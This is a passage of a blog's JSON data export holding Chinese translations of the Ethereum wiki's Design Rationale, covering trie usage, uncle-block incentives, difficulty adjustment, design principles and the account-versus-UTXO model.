的崩溃）。\n","slug":"以太坊wiki-设计原理翻译三","published":1,"updated":"2018-03-09T09:32:59.581Z","layout":"post","photos":[],"link":"","_id":"cjf7piav9000gpkwoxao9iu31","content":"<p><a href=\"https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%BA%8C/\" target=\"_blank\" rel=\"noopener\">以太坊wiki-设计原理翻译二</a></p>\n<h2 id=\"树的使用方式\"><a href=\"#树的使用方式\" class=\"headerlink\" title=\"树的使用方式\"></a>树的使用方式</h2><p>警告：本节内容假设你已经了解了布隆过滤器是如何工作的。详情可见:<a href=\"http://en.wikipedia.org/wiki/Bloom_filter\" target=\"_blank\" rel=\"noopener\">http://en.wikipedia.org/wiki/Bloom_filter</a></p>\n<p>以太坊区块链中的每个区块都包含了 3 个指针指向 3 个 树：状态树（the state trie），代表连接区块之后的全部状态，交易树，代表区块中索引关联的所有交易（即 <code>key 0</code>:第一笔要执行的交易，<code>key 1</code>:第二笔要执行的交易，等等），以及收据树，代表了符合每笔交易的收据（receipts）。对应于一笔交易的收据是一个经过 <code>RLP</code> 编码的数据结构：</p>\n<pre><code>[ medstate, gas_used, logbloom, logs ]\n</code></pre><p>对应的：</p>\n<ul>\n<li><code>medstate</code> 是处理交易之后的状态树的根。</li>\n<li><code>gas_used</code> 是处理该笔交易之后消耗的燃料数量。</li>\n<li><code>logs</code> 是交易执行过程中由 <code>LOG0 ... LOG4</code> 操作码生成的 <code>[address, [topic1, topic2...], data]</code>形式的项目列表（包括主调用和次调用）。<code>address</code> 是产生日志的合约的地址，<code>topics</code> 最多为 4 个 32 字节值，<code>data</code> 是任意大小的字节数组。</li>\n<li><code>logbloom</code> 是交易中所有的日志的 <code>topics</code> 和地址组成的布隆过滤器。<br>  区块头中也有一个布隆（bloom），它是区块中所有交易的布隆的“或”结果。这个结构的目的是使以太坊的轻客户端尽可能的友好。更多以太坊轻客户端和它们的使用实例，见:<a href=\"https://github.com/ethereum/wiki/wiki/Light-client-protocol#principles\" target=\"_blank\" rel=\"noopener\">light client page (principles section)</a>。</li>\n</ul>\n<h2 id=\"叔块激励\"><a href=\"#叔块激励\" class=\"headerlink\" title=\"叔块激励\"></a>叔块激励</h2><p>“贪婪的最重观察子树（Greedy Heaviest Observed Subtree）”（GHOST）协议是 Yonatan Sompolinsky 和 Aviv Zohar 于 2013 年 12 月<a href=\"http://eprint.iacr.org/2013/881.pdf\" target=\"_blank\" rel=\"noopener\">首次</a>推出的一项创新，也是第一次有人认真尝试解决“阻塞越来越快”的问题。<code>GHOST</code> 背后的动机是，目前区块链通过最快确认次数来确认区块的方案，由于过高的陈旧率而降低了安全性 - 因为区块在网络中传播需要一定的时间，如果矿工 A 挖出一个块，然后在矿工 A 的块传播到 B 之前矿工 B 恰巧挖出另一个块 ，矿工 B 的块将会浪费掉（“陈旧”），并且对于网络安全没有任何帮助。此外，还有一个集中化问题：如果矿工 A 是一个拥有3 0％ 算力的矿池，而 B 拥有 10％ 的算力，那么 A 将有 70％ 的时间产生陈旧块的风险（因为另外 30％ 的时间 A 产生了最后一个块，因此将立即获取挖掘数据），而 B 将有 90％ 的时间产生陈旧块的风险。因此，如果区块间隔足够短而导致陈旧率较高，那么凭借其算力，明显地，A 将更高效。将这两种效应结合起来，快速生成区块的区块链很可能导致一个具有足够算力的矿池对挖矿产生垄断。</p>\n<p>正如 Sompolinsky 和 Zohar 所描述的那样，<code>GHOST</code> 通过在计算哪个链是“最长”时包含陈旧块来解决网络安全损失的第一个问题; 也就是说，在计算最长链的工作量证明中，除了该区块的直系祖先区块，还包含了该区块之前被废弃的叔块。</p>\n<p>为了解决可能的中心化问题，我们采用了一个不同的策略：我们对叔块进行奖励：一个叔块会获得它的基本奖励的 7/8(87.5%)，而该叔块的下一个区块会获得基本奖励的 1/32(3.125%)。当然交易费不会作为奖励。</p>\n<p>在以太坊中，一个陈旧的块只能被当做一个叔块，然后从它的兄弟区块往下最多被直系区块包含 7 代，除此之外叔块和其他任何区块都没有关系。这么做的原因如下：首先，不受限制的 <code>GHOST</code> 会在计算哪个叔块对于当前的区块是合法的时候出现大量的困难。其次，在以太坊中使用无限制的叔块激励，会导致矿工对于是否在主链挖矿不再关心，而这可能导致主链被公共攻击。最后，计算表明，限制到七个级别时利大于弊。</p>\n<ul>\n<li>这里有一个可用的衡量集中化风险的仿真器:<a href=\"https://github.com/ethereum/economic-modeling/blob/master/ghost.py\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/economic-modeling/blob/master/ghost.py</a></li>\n<li>一个更高级的讨论:<a href=\"https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/\" target=\"_blank\" rel=\"noopener\">https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/</a></li>\n</ul>\n<p>我们的区块时间算法中的设计决定包含：</p>\n<ul>\n<li><strong>12 秒出块时间</strong>：选择 12 秒作为尽可能快的时间，但同时比网络等待时间长得多。2013年，Decker和Wattenhofer在苏黎世的<a href=\"http://www.tik.ee.ethz.ch/file/49318d3f56c1d525aabf7fda78b23fc0/P2P2013_041.pdf\" target=\"_blank\" rel=\"noopener\">一篇文章</a>测量了比特币的网络延迟，并确定了 12.6 秒是一个新块传播到95％的节点所花费的时间。然而，论文还指出，大部分的传播时间与块的大小成正比，因此越快的货币传播时间越少（in a faster currency we can expect the propagation time to be drastically reduced）。传播间隔的恒定部分约为 2 秒，但是，为了安全起见，我们假设块在我们的分析中需要 12 秒才能传播。</li>\n<li><strong>7 个区块祖先限制</strong>：这是一个设计目标的一部分，希望在块数很少的情况下很快就可以使块的历史被“遗忘”，并且已经证明 7 块已经提供了大部分预期的效果。</li>\n<li><strong>一个区块后代限制</strong>（如，<code>c(c(p(p(p(head)))))</code>，其中 c = child，p = parent，是不合法的）：这是简洁的设计目标的一部分，上面的模拟器显示它不会带来很大的集中化风险。</li>\n<li><strong>叔块验证要求</strong>：叔块必须包含一个有效的头部，而不是区块。这是为了简单起见，并将区块链模型保持为线性数据结构（而不是 Sompolinsky 和 Zohar 的新模型中的块 <code>DAG</code>）。 要求叔块的块合法也是一个有效的方法。</li>\n</ul>\n<h2 id=\"难度调整算法\"><a href=\"#难度调整算法\" class=\"headerlink\" title=\"难度调整算法\"></a>难度调整算法</h2><p>以太坊目前的难度调整规则如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff(genesis) = 2^32</span><br><span class=\"line\"></span><br><span class=\"line\">diff(block) = diff.block.parent + floor(diff.block.parent / 1024) *</span><br><span class=\"line\">\t1 if block.timestamp - block.parent.timestamp &lt; 9 else</span><br><span class=\"line\">\t-1 if block.timestamp - block.parent.timestamp &gt;= 9</span><br></pre></td></tr></table></figure>\n<p>难度调整规则的设计目标是：</p>\n<ul>\n<li><p><strong>快速更新</strong>：区块之间的时间的调整要快。</p>\n</li>\n<li><p><strong>稳定</strong>：如果算力不变，难度不应该过大。</p>\n</li>\n<li><p><strong>简单</strong>：算法实现要简单。</p>\n</li>\n<li><p><strong>占用内存低</strong>：算法不应依赖太多历史区块，并尽可能少地使用内存。假设最后十个块，加上最后十个块的块头中的所有内存变量，这就足够算法运行了。</p>\n</li>\n<li><p><strong>非开发性</strong>：该算法不应该过度鼓励矿工修改时间戳，或者矿池频繁地增加和移除算力，以试图最大化他们的收入。</p>\n</li>\n</ul>\n<p>我们已经确定，我们目前的算法在稳定性和不可利用性方面非常不理想，然后我们打算至少将时间戳相对于父母和祖父母进行切换，这样当矿工挖矿时，他们只会修改时间戳。另一个更强大的仿真器公式位于<a href=\"https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.py\" target=\"_blank\" rel=\"noopener\"><code>https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.p</code></a>（仿真器使用比特币的挖矿能力，但只使用当天的均值;它在一天的时间内，在某个点模拟 95% 的崩溃）。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://xingyunbite.github.io/2018/02/09/%E4%BB%A5%E5%A4%AA%E5%9D%8Awiki-%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86%E7%BF%BB%E8%AF%91%E4%BA%8C/\" target=\"_blank\" rel=\"noopener\">以太坊wiki-设计原理翻译二</a></p>\n<h2 id=\"树的使用方式\"><a href=\"#树的使用方式\" class=\"headerlink\" title=\"树的使用方式\"></a>树的使用方式</h2><p>警告：本节内容假设你已经了解了布隆过滤器是如何工作的。详情可见:<a href=\"http://en.wikipedia.org/wiki/Bloom_filter\" target=\"_blank\" rel=\"noopener\">http://en.wikipedia.org/wiki/Bloom_filter</a></p>\n<p>以太坊区块链中的每个区块都包含了 3 个指针指向 3 个 树：状态树（the state trie），代表连接区块之后的全部状态，交易树，代表区块中索引关联的所有交易（即 <code>key 0</code>:第一笔要执行的交易，<code>key 1</code>:第二笔要执行的交易，等等），以及收据树，代表了符合每笔交易的收据（receipts）。对应于一笔交易的收据是一个经过 <code>RLP</code> 编码的数据结构：</p>\n<pre><code>[ medstate, gas_used, logbloom, logs ]\n</code></pre><p>对应的：</p>\n<ul>\n<li><code>medstate</code> 是处理交易之后的状态树的根。</li>\n<li><code>gas_used</code> 是处理该笔交易之后消耗的燃料数量。</li>\n<li><code>logs</code> 是交易执行过程中由 <code>LOG0 ... LOG4</code> 操作码生成的 <code>[address, [topic1, topic2...], data]</code>形式的项目列表（包括主调用和次调用）。<code>address</code> 是产生日志的合约的地址，<code>topics</code> 最多为 4 个 32 字节值，<code>data</code> 是任意大小的字节数组。</li>\n<li><code>logbloom</code> 是交易中所有的日志的 <code>topics</code> 和地址组成的布隆过滤器。<br>  区块头中也有一个布隆（bloom），它是区块中所有交易的布隆的“或”结果。这个结构的目的是使以太坊的轻客户端尽可能的友好。更多以太坊轻客户端和它们的使用实例，见:<a href=\"https://github.com/ethereum/wiki/wiki/Light-client-protocol#principles\" target=\"_blank\" rel=\"noopener\">light client page (principles section)</a>。</li>\n</ul>\n<h2 id=\"叔块激励\"><a href=\"#叔块激励\" class=\"headerlink\" title=\"叔块激励\"></a>叔块激励</h2><p>“贪婪的最重观察子树（Greedy Heaviest Observed Subtree）”（GHOST）协议是 Yonatan Sompolinsky 和 Aviv Zohar 于 2013 年 12 月<a href=\"http://eprint.iacr.org/2013/881.pdf\" target=\"_blank\" rel=\"noopener\">首次</a>推出的一项创新，也是第一次有人认真尝试解决“阻塞越来越快”的问题。<code>GHOST</code> 背后的动机是，目前区块链通过最快确认次数来确认区块的方案，由于过高的陈旧率而降低了安全性 - 因为区块在网络中传播需要一定的时间，如果矿工 A 挖出一个块，然后在矿工 A 的块传播到 B 之前矿工 B 恰巧挖出另一个块 ，矿工 B 的块将会浪费掉（“陈旧”），并且对于网络安全没有任何帮助。此外，还有一个集中化问题：如果矿工 A 是一个拥有3 0％ 算力的矿池，而 B 拥有 10％ 的算力，那么 A 将有 70％ 的时间产生陈旧块的风险（因为另外 30％ 的时间 A 产生了最后一个块，因此将立即获取挖掘数据），而 B 将有 90％ 的时间产生陈旧块的风险。因此，如果区块间隔足够短而导致陈旧率较高，那么凭借其算力，明显地，A 将更高效。将这两种效应结合起来，快速生成区块的区块链很可能导致一个具有足够算力的矿池对挖矿产生垄断。</p>\n<p>正如 Sompolinsky 和 Zohar 所描述的那样，<code>GHOST</code> 通过在计算哪个链是“最长”时包含陈旧块来解决网络安全损失的第一个问题; 也就是说，在计算最长链的工作量证明中，除了该区块的直系祖先区块，还包含了该区块之前被废弃的叔块。</p>\n<p>为了解决可能的中心化问题，我们采用了一个不同的策略：我们对叔块进行奖励：一个叔块会获得它的基本奖励的 7/8(87.5%)，而该叔块的下一个区块会获得基本奖励的 1/32(3.125%)。当然交易费不会作为奖励。</p>\n<p>在以太坊中，一个陈旧的块只能被当做一个叔块，然后从它的兄弟区块往下最多被直系区块包含 7 代，除此之外叔块和其他任何区块都没有关系。这么做的原因如下：首先，不受限制的 <code>GHOST</code> 会在计算哪个叔块对于当前的区块是合法的时候出现大量的困难。其次，在以太坊中使用无限制的叔块激励，会导致矿工对于是否在主链挖矿不再关心，而这可能导致主链被公共攻击。最后，计算表明，限制到七个级别时利大于弊。</p>\n<ul>\n<li>这里有一个可用的衡量集中化风险的仿真器:<a href=\"https://github.com/ethereum/economic-modeling/blob/master/ghost.py\" target=\"_blank\" rel=\"noopener\">https://github.com/ethereum/economic-modeling/blob/master/ghost.py</a></li>\n<li>一个更高级的讨论:<a href=\"https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/\" target=\"_blank\" rel=\"noopener\">https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/</a></li>\n</ul>\n<p>我们的区块时间算法中的设计决定包含：</p>\n<ul>\n<li><strong>12 秒出块时间</strong>：选择 12 秒作为尽可能快的时间，但同时比网络等待时间长得多。2013年，Decker和Wattenhofer在苏黎世的<a href=\"http://www.tik.ee.ethz.ch/file/49318d3f56c1d525aabf7fda78b23fc0/P2P2013_041.pdf\" target=\"_blank\" rel=\"noopener\">一篇文章</a>测量了比特币的网络延迟，并确定了 12.6 秒是一个新块传播到95％的节点所花费的时间。然而，论文还指出，大部分的传播时间与块的大小成正比，因此越快的货币传播时间越少（in a faster currency we can expect the propagation time to be drastically reduced）。传播间隔的恒定部分约为 2 秒，但是，为了安全起见，我们假设块在我们的分析中需要 12 秒才能传播。</li>\n<li><strong>7 个区块祖先限制</strong>：这是一个设计目标的一部分，希望在块数很少的情况下很快就可以使块的历史被“遗忘”，并且已经证明 7 块已经提供了大部分预期的效果。</li>\n<li><strong>一个区块后代限制</strong>（如，<code>c(c(p(p(p(head)))))</code>，其中 c = child，p = parent，是不合法的）：这是简洁的设计目标的一部分，上面的模拟器显示它不会带来很大的集中化风险。</li>\n<li><strong>叔块验证要求</strong>：叔块必须包含一个有效的头部，而不是区块。这是为了简单起见，并将区块链模型保持为线性数据结构（而不是 Sompolinsky 和 Zohar 的新模型中的块 <code>DAG</code>）。 要求叔块的块合法也是一个有效的方法。</li>\n</ul>\n<h2 id=\"难度调整算法\"><a href=\"#难度调整算法\" class=\"headerlink\" title=\"难度调整算法\"></a>难度调整算法</h2><p>以太坊目前的难度调整规则如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff(genesis) = 2^32</span><br><span class=\"line\"></span><br><span class=\"line\">diff(block) = diff.block.parent + floor(diff.block.parent / 1024) *</span><br><span class=\"line\">\t1 if block.timestamp - block.parent.timestamp &lt; 9 else</span><br><span class=\"line\">\t-1 if block.timestamp - block.parent.timestamp &gt;= 9</span><br></pre></td></tr></table></figure>\n<p>难度调整规则的设计目标是：</p>\n<ul>\n<li><p><strong>快速更新</strong>：区块之间的时间的调整要快。</p>\n</li>\n<li><p><strong>稳定</strong>：如果算力不变，难度不应该过大。</p>\n</li>\n<li><p><strong>简单</strong>：算法实现要简单。</p>\n</li>\n<li><p><strong>占用内存低</strong>：算法不应依赖太多历史区块，并尽可能少地使用内存。假设最后十个块，加上最后十个块的块头中的所有内存变量，这就足够算法运行了。</p>\n</li>\n<li><p><strong>非开发性</strong>：该算法不应该过度鼓励矿工修改时间戳，或者矿池频繁地增加和移除算力，以试图最大化他们的收入。</p>\n</li>\n</ul>\n<p>我们已经确定，我们目前的算法在稳定性和不可利用性方面非常不理想，然后我们打算至少将时间戳相对于父母和祖父母进行切换，这样当矿工挖矿时，他们只会修改时间戳。另一个更强大的仿真器公式位于<a href=\"https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.py\" target=\"_blank\" rel=\"noopener\"><code>https://github.com/ethereum/economic-modeling/blob/master/diffadjust/blkdiff.p</code></a>（仿真器使用比特币的挖矿能力，但只使用当天的均值;它在一天的时间内，在某个点模拟 95% 的崩溃）。</p>\n"},{"title":"以太坊wiki-设计原理翻译一","comments":0,"date":"2018-02-09T03:22:26.000Z","img":null,"_content":"## [设计原理原文链接](https://github.com/ethereum/wiki/wiki/Design-Rationale)\n\n尽管以太坊借鉴了许多已经在比特币这样的老式加密货币中经过了5年的尝试和测试的想法，但是以太坊在处理某些协议特征方面与常见方式有很多不同之处，因为目前现存的系统中没有以太坊需要的功能，所以以太坊另外开发了全新的功能。本文档的目的是详细说明在制定以太坊协议过程中所做出的所有可能不明显的或有些有争议的决定，以及显示我们的方法和可能的替代方案所涉及的风险。\n\n## 原则\n\n以太坊协议的设计过程遵循了下列原则：\n\n1. **三明治复杂模型**：我们相信以太坊结构的底层应该尽可能的简单，并且与以太坊的交互接口（包括开发者使用的高级编程语言以及用户的使用界面）应该尽可能的易懂。在复杂性不可避免的情况下，它应该被推入协议的“中间层”，它们不是核心共识的一部分，但也不被终端用户看到，如高级语言编译器，参数序列化和反序列化脚本，存储 数据结构模型，`leveldb`存储接口和有线协议等。但是，这种偏好并不是绝对的。\n\n2. **自由**：用户在使用以太坊协议的时候不应该被限制，我们也不应该试图去表示喜欢或者不喜欢他们基于某种目的而使用的以太坊合约或者交易。这类似于和“网络中立”背后的指导原则。一个没有遵循此原则的例子是比特币交易协议中的情况，它不鼓励使用区块链来做“非标签”（如数据存储，元协议）目的的行为，并且在某些情况下明确了对准协议的改变（如 `OP_RETURN` 限制为 40 字节），试图以“未授权”方式使用区块链来攻击应用。在 `Ethereum` 中，我们强烈支持设置交易费用，这样大致上就会具有激励作用，这样，使用区块链的用户会以膨胀（`bloat-producing`）的方式内部化其活动成本（即 `Pigovian` 税）。\n\n3. **概念**：以太坊中的协议特征和操作码应该体现最低级别的概念，以便可以以任意的方式进行组合，包括今天可能看起来不太有用但以后可能会变得有用的方法，然后当这些概念对于使用了这些概念的功能来说不再必要的时候，就可以通过剥离它们来提升效率。遵循这个原则的一个例子是我们选择 `LOG` 操作码作为向（特别是轻客户端）`dapps` 提供信息的一种方式，而不是像之前建议的那样在内部简单地记录所有事务和消息 - “消息”的概念是包括“方法调用”和“外部观察者感兴趣的事件”在内的多个概念的聚集，理应分离这两个概念。\n\n4. **我们没有特征**：作为泛化的必然结果，我们常常拒绝将十分常见的高级使用示例作为协议的一部分，我们认为如果人们真的需要做一件事情，那么他可以在一个合约内部创建一个子协议。一个例子是以太坊中缺少与比特币中一样“锁定时间”的功能，因为这样的功能可以通过用户发送“签名数据包”协议来模拟，然后这些数据包可以被输入到专门的合同中处理，并且如果数据包符合合同的一些条件，就会触发相应的功能。\n\n5. **非风险规避**：如果风险增加的变化提供了非常可观的收益（例如，广义的状态转换，50倍的更快的阻塞时间，共识效率等），那么我们可以承受更高的风险程度。\n\n这些原则在规定以太坊开发中都涉及到，但它们并不是绝对的，在某些情况下，为了减少开发时间或者避免一次性尝试太多激进的东西，我们会推迟某些明显有利的变革，以便将来发行（如以太坊1.1）。\n\n## 区块链层次的协议\n\n这部分描述了以太坊中对区块链层次协议所做的一些改变，包括了区块和交易是如何工作的，数据是如何序列化和存储的，以及账户背后的机制。\n\n### 账户和非 `UTXOs`\n\n比特币，以及许多由它衍生而来的系统，将用户的资产数据存储在一个基于 `unspent transaction outputs(UTXOs)` 的结构中：整个系统的状态由一系列未花费输出（联想成“币”）组成，所以每个币都有一个主人和面值，而一笔交易可以花费一个或更多的币并且创建一个或更多的币，有效性的约束有：\n\n1. 每一个被引用的输入必须是合法的并且没有被花费过\n2. 交易中的每一个输入都必须有一个符合该输入的主人的签名\n3. 所有的输入必须大于等于所有的输出\n\n因此，系统中用户的“余额”是用户具有能够产生有效签名的私钥的一组硬币的总值。\n\n![](https://bitcoin.org/img/dev/en-transaction-propagation.svg)\n\n(图片来自 `https://bitcoin.org/en/developer-guide`)\n\n以太坊抛弃这个方案，转而采用更简单的方法：使用状态存储一个账户列表，其中每个账户都有一个余额，以及以太坊特定的数据（代码和内部存储）。一笔交易会在发送账户有足够的余额支付的情况下生效，此时，发送账户减少余额，收款账户增加余额。如果接收账户有代码，代码会运行，而内部存储也可能被更改，或者代码甚至可能会创建额外的消息给其他账户，从而导致进一步的余额变更。\n\n`UTXOs` 的好处：\n\n1. **高度的隐私性**：如果用户接受每笔交易的时候都使用一个新地址，那么就很难将账户连接起来。这很适用于货币，但是对任意 `dapps` 就不是那么合适了，因为 `dapps` 常常需要对用户的一系列复杂的状态保持跟踪，并且可能不存在像货币那样简单的用户状态分区方案。\n2. **潜在的可扩展性范例**：`UTXO` 在理论上更与某些可扩展性模式相兼容，因为我们只能依靠一些拥有 `Merkle` 所有权证明的币的所有者，即使包括所有者在内的每个人都决定忘记这些数据，只有所有者受到损害( and even if everyone including the owner decides to forget that data then only the owner is harmed)。 在一个账户范例中，一旦某个人失去其账户对应的部分 `Merkle` 树，将使得不可能以任何方式处理该账户相关的消息，包括发送给它。 但是，非 `UTXO` 依赖的可伸缩性范例确实存在。\n\n账户的好处：\n\n1. **节省了大量空间**：例如，如果一个账户有 5 个 `UTXO`，然后将一个 `UTXO` 模型转换成账户模型，它的空间要求就会从 （20 + 32 + 8）* 5 = 300 bytes(20 是地址，32 是 `txid`，8 是值)减少到 20 + 8 + 2 = 30 bytes(20 是地址，8 是值，2 是 `nonce`)。实际上，要求的存储空间没有这么大，因为账户需要存储在 `Patricia` 树中（见下文），但是它们仍然很大。（In reality savings are not nearly this massive because accounts need to be stored in a Patricia tree (see below) but they are nevertheless large. ）另外，交易可以更小（如以太坊中需要 100 bytes 而比特币中需要 200 - 250 bytes），因为每笔交易只需要使用一个引用，一个签名以及一个输出。\n2. **更好的可替代性**：因为没有区块链层次的特定币来源的概念，所以从技术上和法律上来说，建立一个红名单/黑名单方案并根据它们的来源来区分币就很不现实。\n3. **简单**：编码简单易懂，特别是涉及到复杂脚本的时候。虽然也可以强制使用 `UTXO` 模型来实现 `dapp`，但本质上是通过赋予脚本能力，来限制给定的 `UTXO` 可以以哪种 `UTXO` 类型来花费，并且需要花费包括根据脚本评估的 `Merkle` 树中的应用程序状态改变的证明的 `Merkle` 树的根（and requiring spends to include Merkle tree proofs of change-of-application-state-root that scripts evaluate），这样的范例比使用帐户更加复杂和难看。\n4. **持久的轻客户端引用**：轻客户端可以在任何时候通过定向扫描一棵状态树来访问一个账户相关的所有数据。在 `UTXO` 模型中，每笔交易都会改变引用，这对于试图使用上面提到的 `UTXO` 状态传播机制的长期运行的 `dapps` 来说，这是一个特别麻烦的问题。\n\n我们已经做好了决定，因为对于我们正在处理的包含任意状态和代码的 `dapps` 来说，帐户模型远比其他要好。 此外，本着“我们没有特征”原则的精神，我们认为，如果人们确实关心隐私，那么可以通过合同内的签名数据包协议来建立混淆器（mixer）和组合币（coinjoin）。\n\n账户模型的一个缺点是，为了防止重放攻击，每笔交易都必须有一个 `nonce` 值，这样账户就可以对使用的 `nonce` 进行跟踪，并且只接受当前 `nonce` 值比之前的 `nonce` 值多 1 的交易。这意味着即使是废弃的账号也不会删除账号状态。解决这个问题的一个简单方法是要求每笔交易都包含一个区块号，使得它们在一段时期之后就不能够被重放，并且在每个时期都重置一次 `nonce`。矿工或者其他用户会对账户进行 `ping` 操作，然后删除状态中的未使用账户，因为作为区块链协议的一部分，进行全部扫描的代价太高了。我们没有用这个机制只是为了加快 `1.0` 的发展; `1.1` 及以后可能会使用这样一个系统。\n","source":"_posts/以太坊wiki-设计原理翻译一.md","raw":"---\ntitle: 以太坊wiki-设计原理翻译一\ncomments: false\ndate: 2018-02-09 11:22:26\ncategories: 区块链\ntags: \n- ZhouFyk \n- 以太坊 \n- ethereum\nimg:\n---\n## [设计原理原文链接](https://github.com/ethereum/wiki/wiki/Design-Rationale)\n\n尽管以太坊借鉴了许多已经在比特币这样的老式加密货币中经过了5年的尝试和测试的想法，但是以太坊在处理某些协议特征方面与常见方式有很多不同之处，因为目前现存的系统中没有以太坊需要的功能，所以以太坊另外开发了全新的功能。本文档的目的是详细说明在制定以太坊协议过程中所做出的所有可能不明显的或有些有争议的决定，以及显示我们的方法和可能的替代方案所涉及的风险。\n\n## 原则\n\n以太坊协议的设计过程遵循了下列原则：\n\n1. **三明治复杂模型**：我们相信以太坊结构的底层应该尽可能的简单，并且与以太坊的交互接口（包括开发者使用的高级编程语言以及用户的使用界面）应该尽可能的易懂。在复杂性不可避免的情况下，它应该被推入协议的“中间层”，它们不是核心共识的一部分，但也不被终端用户看到，如高级语言编译器，参数序列化和反序列化脚本，存储 数据结构模型，`leveldb`存储接口和有线协议等。但是，这种偏好并不是绝对的。\n\n2. **自由**：用户在使用以太坊协议的时候不应该被限制，我们也不应该试图去表示喜欢或者不喜欢他们基于某种目的而使用的以太坊合约或者交易。这类似于和“网络中立”背后的指导原则。一个没有遵循此原则的例子是比特币交易协议中的情况，它不鼓励使用区块链来做“非标签”（如数据存储，元协议）目的的行为，并且在某些情况下明确了对准协议的改变（如 `OP_RETURN` 限制为 40 字节），试图以“未授权”方式使用区块链来攻击应用。在 `Ethereum` 中，我们强烈支持设置交易费用，这样大致上就会具有激励作用，这样，使用区块链的用户会以膨胀（`bloat-producing`）的方式内部化其活动成本（即 `Pigovian` 税）。\n\n3. **概念**：以太坊中的协议特征和操作码应该体现最低级别的概念，以便可以以任意的方式进行组合，包括今天可能看起来不太有用但以后可能会变得有用的方法，然后当这些概念对于使用了这些概念的功能来说不再必要的时候，就可以通过剥离它们来提升效率。遵循这个原则的一个例子是我们选择 `LOG` 操作码作为向（特别是轻客户端）`dapps` 提供信息的一种方式，而不是像之前建议的那样在内部简单地记录所有事务和消息 - “消息”的概念是包括“方法调用”和“外部观察者感兴趣的事件”在内的多个概念的聚集，理应分离这两个概念。\n\n4. **我们没有特征**：作为泛化的必然结果，我们常常拒绝将十分常见的高级使用示例作为协议的一部分，我们认为如果人们真的需要做一件事情，那么他可以在一个合约内部创建一个子协议。一个例子是以太坊中缺少与比特币中一样“锁定时间”的功能，因为这样的功能可以通过用户发送“签名数据包”协议来模拟，然后这些数据包可以被输入到专门的合同中处理，并且如果数据包符合合同的一些条件，就会触发相应的功能。\n\n5. **非风险规避**：如果风险增加的变化提供了非常可观的收益（例如，广义的状态转换，50倍的更快的阻塞时间，共识效率等），那么我们可以承受更高的风险程度。\n\n这些原则在规定以太坊开发中都涉及到，但它们并不是绝对的，在某些情况下，为了减少开发时间或者避免一次性尝试太多激进的东西，我们会推迟某些明显有利的变革，以便将来发行（如以太坊1.1）。\n\n## 区块链层次的协议\n\n这部分描述了以太坊中对区块链层次协议所做的一些改变，包括了区块和交易是如何工作的，数据是如何序列化和存储的，以及账户背后的机制。\n\n### 账户和非 `UTXOs`\n\n比特币，以及许多由它衍生而来的系统，将用户的资产数据存储在一个基于 `unspent transaction outputs(UTXOs)` 的结构中：整个系统的状态由一系列未花费输出（联想成“币”）组成，所以每个币都有一个主人和面值，而一笔交易可以花费一个或更多的币并且创建一个或更多的币，有效性的约束有：\n\n1. 每一个被引用的输入必须是合法的并且没有被花费过\n2. 交易中的每一个输入都必须有一个符合该输入的主人的签名\n3. 所有的输入必须大于等于所有的输出\n\n因此，系统中用户的“余额”是用户具有能够产生有效签名的私钥的一组硬币的总值。\n\n![](https://bitcoin.org/img/dev/en-transaction-propagation.svg)\n\n(图片来自 `https://bitcoin.org/en/developer-guide`)\n\n以太坊抛弃这个方案，转而采用更简单的方法：使用状态存储一个账户列表，其中每个账户都有一个余额，以及以太坊特定的数据（代码和内部存储）。一笔交易会在发送账户有足够的余额支付的情况下生效，此时，发送账户减少余额，收款账户增加余额。如果接收账户有代码，代码会运行，而内部存储也可能被更改，或者代码甚至可能会创建额外的消息给其他账户，从而导致进一步的余额变更。\n\n`UTXOs` 的好处：\n\n1. **高度的隐私性**：如果用户接受每笔交易的时候都使用一个新地址，那么就很难将账户连接起来。这很适用于货币，但是对任意 `dapps` 就不是那么合适了，因为 `dapps` 常常需要对用户的一系列复杂的状态保持跟踪，并且可能不存在像货币那样简单的用户状态分区方案。\n2. **潜在的可扩展性范例**：`UTXO` 在理论上更与某些可扩展性模式相兼容，因为我们只能依靠一些拥有 `Merkle` 所有权证明的币的所有者，即使包括所有者在内的每个人都决定忘记这些数据，只有所有者受到损害( and even if everyone including the owner decides to forget that data then only the owner is harmed)。 在一个账户范例中，一旦某个人失去其账户对应的部分 `Merkle` 树，将使得不可能以任何方式处理该账户相关的消息，包括发送给它。 但是，非 `UTXO` 依赖的可伸缩性范例确实存在。\n\n账户的好处：\n\n1. **节省了大量空间**：例如，如果一个账户有 5 个 `UTXO`，然后将一个 `UTXO` 模型转换成账户模型，它的空间要求就会从 （20 + 32 + 8）* 5 = 300 bytes(20 是地址，32 是 `txid`，8 是值)减少到 20 + 8 + 2 = 30 bytes(20 是地址，8 是值，2 是 `nonce`)。实际上，要求的存储空间没有这么大，因为账户需要存储在 `Patricia` 树中（见下文），但是它们仍然很大。（In reality savings are not nearly this massive because accounts need to be stored in a Patricia tree (see below) but they are nevertheless large. ）另外，交易可以更小（如以太坊中需要 100 bytes 而比特币中需要 200 - 250 bytes），因为每笔交易只需要使用一个引用，一个签名以及一个输出。\n2. **更好的可替代性**：因为没有区块链层次的特定币来源的概念，所以从技术上和法律上来说，建立一个红名单/黑名单方案并根据它们的来源来区分币就很不现实。\n3. **简单**：编码简单易懂，特别是涉及到复杂脚本的时候。虽然也可以强制使用 `UTXO` 模型来实现 `dapp`，但本质上是通过赋予脚本能力，来限制给定的 `UTXO` 可以以哪种 `UTXO` 